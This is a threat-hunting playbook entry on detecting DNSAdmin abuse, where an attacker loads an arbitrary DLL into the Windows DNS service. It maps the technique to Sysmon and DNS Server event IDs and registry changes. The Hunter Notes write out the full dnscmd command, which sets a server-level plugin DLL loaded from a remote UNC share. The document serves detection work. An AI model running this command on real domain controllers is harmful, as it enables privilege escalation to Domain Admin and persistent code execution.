# Windows DNS Server dll injection via RPC (DnssrvOperation2)
## Technique ID
T0000_dns_serverdll_injection


## Description
The Windows DNS Server management protocol, which is based on RPC, allows
DnsAdmins and higher privileged Users to load arbitary dlls as plugins into the
DNS service

You can find a detailed description
[here](https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83).


## Hypothesis
Adversaries might be abusing DNSAdmin privileges to escalate privileges to
Domain Admin and achieve persistence by loading arbitary dlls as plugins into
the DNS service in my environment.


## Events (dnscmd execution)

| Source | EventID | EventField | Details | Reference | 
|--------|---------|-------|---------|-----------| 
| Sysmon | 13 | EventType |SetType - TargetObject gets set (see next line) | detailed event log: [dim0x69](https://blog.3or.de/hunting-dns-server-level-plugin-dll-injection.html) |
| Sysmon | 13 | TargetObject |REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\DNS\Parameters\ServerLevelPluginDll gets set to the dll path | detailed event log: [dim0x69](https://blog.3or.de/hunting-dns-server-level-plugin-dll-injection.html) |
| Microsoft-Windows-DNSServer | 541 | Data Name="Setting" | serverlevelplugindll (**case insensitive**), parameter as set by the attacker when executing dnscmd | detailed event log: [dim0x69](https://blog.3or.de/hunting-dns-server-level-plugin-dll-injection.html) |
| Microsoft-Windows-DNSServer | 541 | Data Name="NewValue" | \\192.168.0.149\dll\wtf.dll (**case insensitive**), parameter to the /serverlevelplugindll command as executed by the attacker | detailed event log: [dim0x69](https://blog.3or.de/hunting-dns-server-level-plugin-dll-injection.html) |


## Events (DNS service restarted)
| Source | EventID | EventField | Details | Reference | 
|--------|---------|-------|---------|-----------| 
| DNS Server | 771 | | Event gets logged when a dll plugin is loaded by the DNS service |detailed event log: [dim0x69](https://blog.3or.de/hunting-dns-server-level-plugin-dll-injection.html) |
| DNS Server | 770 | EventData Name="DNS_EVENT_PLUGIN_DLL_LOAD_OK" | |detailed event log: [dim0x69](https://blog.3or.de/hunting-dns-server-level-plugin-dll-injection.html) |
| DNS Server | 770 | Name="param1" \\192.168.0.149\dll\wtf.dll" | | detailed event log: [dim0x69](https://blog.3or.de/hunting-dns-server-level-plugin-dll-injection.html) |
| Sysmon | 7 | ImageLoaded | icmp.dll, oleauth32.dll, wtf.dll (specified plugin dll) | details: [dim0x69](https://blog.3or.de/hunting-dns-server-level-plugin-dll-injection.html) |


## Events (when loading the dll failed)
| Source | EventID | EventField | Details | Reference | 
|--------|---------|-------|---------|-----------| 
| DNS Server | 150 | EventData Name="DNS_EVENT_PLUGIN_INIT_FAILED" | |detailed event log: [dim0x69](https://blog.3or.de/hunting-dns-server-level-plugin-dll-injection.html) |
| DNS Server | 150 | Name="param1" \\192.168.0.149\dll\wtf.dll" | | detailed event log: [dim0x69](https://blog.3or.de/hunting-dns-server-level-plugin-dll-injection.html) |


## Atomic Sysmon Configuration
[T0000_dns_serverdll_injection.xml](https://github.com/Cyb3rWard0g/ThreatHunter-Playbook/blob/master/attack_matrix/windows/sysmon_configs/T0000_dns_serverdll_injection.xml)


## Hunter Notes
We assume the attacker has a privileged user to reconfigure the DNS service:

The attack has to be executed in two steps:

  1. dnscmd.exe dc1.lab.internal /config /serverlevelplugindll \\192.168.0.149\dll\wtf.dll
    - Whereas the dll has to be as a special DNS server plugin dll.
      ([GitHub 0xdim69](https://github.com/dim0x69/dns-exe-persistance/tree/master/dns-plugindll-vcpp))
    - A registry parameter gets added: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll and set to the value \\\\192.168.0.149\dll\wtf.dll

  2. The DNS service gets restarted
    - The DLL is loaded into dns.exe and the API functions are called.

## Hunting Techniques Recommended

- [x] Grouping
- [x] Searching
- [ ] Clustering
- [ ] Stack Counting
- [ ] Scatter Plots
- [ ] Box Plots
- [ ] Isolation Forests

